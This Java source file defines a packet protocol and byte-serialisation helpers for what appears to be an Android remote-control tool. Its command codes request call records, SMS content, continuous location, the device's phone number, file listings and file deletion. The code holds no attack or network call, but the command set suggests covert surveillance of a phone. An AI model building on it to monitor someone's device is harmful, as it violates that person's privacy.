/**
 * 
 */
package com.byc.control;

/**
 * @author byc:协议格式：包头+命令+数据长度+数据体
 *
 */
public class order {
	public static final int PID = 8800;//命令标识(包头标识)；
	public static final int VER = 1001;//版本号(包头标识)；
	public static final int ENC = 7618;//加密字(包头标识)；
	public static final int CMD_READY = 1001;//准备好命令；
	public static final int CMD_INFO = 1002;//获取信息命令；
	public static final int CMD_CALL = 1004;//获取通话记录命令；
	public static final int CMD_LOCATION_SINGLE = 2001;//获取定位信息：
	public static final int CMD_LOCATION_SERIES = 2002;//连续获取定位信息：
	public static final int CMD_LOCATION_STOP = 2003;//停止获取定位信息：
	public static final int CMD_SMS_CONTENT = 3001;//获取短信内容命令；
	public static final int CMD_SMS_PHONE_NUMBER = 3002;//查询本机号码命令；
	
	public static final int CMD_FILE_LIST = 4001;//列举目录；传递绝对路径；
	public static final int CMD_FILE_TRANS=4002;//列举外置SD卡目录；
	public static final int CMD_FILE_DEL=4003;//删除文件
	
	public static final int PH_SIZE=24;
	public static final int DATA_SIZE=1024;//数据体缓存大小；
	public static final int MAX_PATH=260;//目录长度大小；
	public static final int MAX_FILE_NAME=64;//文件名长度；
	public static final int MAX_TIME_STR=24;//时间字符串长度；
	
	public static final int FILE_DIR_ROOT=4100;//根目录；
	public static final int FILE_DIR_EX_SD = 4101;//外置SD卡目录标志;
	public static final int FILE_DIR_SD = 4102;//内置SD卡目录标志;
	public static final int FILE_DIR_PHOTO = 4103;//相册目录;
	//public static byte[] PackageHeader= new byte[PH_SIZE];//包头：标识+命令+数据长度;
	//public static byte[] b = {0,0,0,0};//缓存
	//public static byte[] data = new byte[DATA_SIZE];//数据体缓存
	//public static byte[] pdata = null;//数据体缓存
	//public static OrderHeader oh=new OrderHeader();//命令头
	
	public static byte[] toLH(int n) {
		byte[] b = {0,0,0,0};
		b[0] = (byte) (n & 0xff);
		b[1] = (byte) (n >> 8 & 0xff);
		b[2] = (byte) (n >> 16 & 0xff);
		b[3] = (byte) (n >> 24 & 0xff);
		return b;
	}
	public static int byteToInt(byte[] byteVal) {
		int result = 0;
		for (int i = 0; i < byteVal.length; i++) {
			int tmpVal = (byteVal[i] << (8 * (3 - i)));
			switch (i) {
			case 0:
				tmpVal = tmpVal & 0xFF000000;
				break;
			case 1:
				tmpVal = tmpVal & 0x00FF0000;
				break;
			case 2:
				tmpVal = tmpVal & 0x0000FF00;
				break;
			case 3:
				tmpVal = tmpVal & 0x000000FF;
				break;
			}
			result = result | tmpVal;
		}
		return result;
	}
	/*
	 * ：
	 */
	public static byte[] double2Bytes(double d) {  
        long value = Double.doubleToRawLongBits(d);  
        byte[] byteRet = new byte[8];  
        for (int i = 0; i < 8; i++) {  
            byteRet[i] = (byte) ((value >> 8 * i) & 0xff);  
        }  
        return byteRet;  
    }  
	/*
	 * ：
	 */
	public static double bytes2Double(byte[] arr) {  
        long value = 0;  
        for (int i = 0; i < 8; i++) {  
            value |= ((long) (arr[i] & 0xff)) << (8 * i);  
        }  
        return Double.longBitsToDouble(value);  
    }  
	//*********************************************************************************************
	/*
	 * 将命令头格式化为字节流：
	 */
	public static byte[] formatOHtoPH(OrderHeader oh,byte[] ph){
		byte[] temp = {0,0,0,0};
		//byte[] PackageHeader=new byte[PH_SIZE];
		// add ID
		temp =toLH(oh.pid);
		System.arraycopy(temp, 0, ph, 0, 4);
		// add ver
		temp =toLH(oh.ver);
		System.arraycopy(temp, 0, ph, 4, 4);
		// add ver
		temp =toLH(oh.enc);
		System.arraycopy(temp, 0, ph, 8, 4);
		// add cmd
		temp =toLH(oh.cmd);
		System.arraycopy(temp, 0, ph,12, 4);
		// add cmd
		temp =toLH(oh.len);
		System.arraycopy(temp, 0, ph,16, 4);
		// add cmd
		temp =toLH(oh.dat);
		System.arraycopy(temp, 0, ph,20, 4);
		return ph;
	}
	/*
	 * 将字节流格式化为包头：
	 */
	public static  OrderHeader formatPHtoOH(byte[] ph,OrderHeader oh){
		byte[] b = {0,0,0,0};
		//OrderHeader oh=new OrderHeader();
		int cForm;
		System.arraycopy(ph, 0, b,0, 4);
		cForm = byteToInt(b);
		oh.pid= byteToInt(toLH(cForm));
		
		System.arraycopy(ph, 4, b,0, 4);
		cForm = byteToInt(b);
		oh.ver= byteToInt(toLH(cForm));
		
		System.arraycopy(ph, 8, b,0, 4);
		cForm = byteToInt(b);
		oh.enc= byteToInt(toLH(cForm));
		
		System.arraycopy(ph, 12, b,0, 4);
		cForm = byteToInt(b);
		oh.cmd=byteToInt(toLH(cForm));
		
		System.arraycopy(ph, 16, b,0, 4);
		cForm = byteToInt(b);
		oh.len=byteToInt(toLH(cForm));
		
		System.arraycopy(ph, 20, b,0, 4);
		cForm = byteToInt(b);
		oh.dat=byteToInt(toLH(cForm));
		return oh;
	}
	/*
	 * 生成准备好命令包头：
	 */
	public static byte[] CreateReadyPH(OrderHeader oh,byte[] ph){
		//OrderHeader oh=new OrderHeader();
		oh.pid=PID;
		oh.ver=VER;
		oh.enc=ENC;
		oh.cmd=CMD_READY;
		oh.len=0;
		return formatOHtoPH(oh,ph);
	}
	/*
	 * 校验命令头：
	 */
	public static boolean VerifyOH(OrderHeader oh){
		boolean b=true;
		if(oh.pid!=PID)b=false;
		if(oh.ver!=VER)b=false;
		if(oh.enc!=ENC)b=false;
		return b;
	}
	/*
	 * 格式化命令头：
	 */
	public static OrderHeader formatOH(OrderHeader oh){
		oh.pid=PID;
		oh.ver=VER;
		oh.enc=ENC;
		oh.cmd=CMD_READY;
		oh.len=0;
		oh.dat=0;
		return oh;
	}
	/*
	 * 将字节流格式化为整型：
	 */
	public static  int byte2Int(byte[] b){
		int cForm;
		cForm = byteToInt(b);
		return byteToInt(toLH(cForm));
	}
}
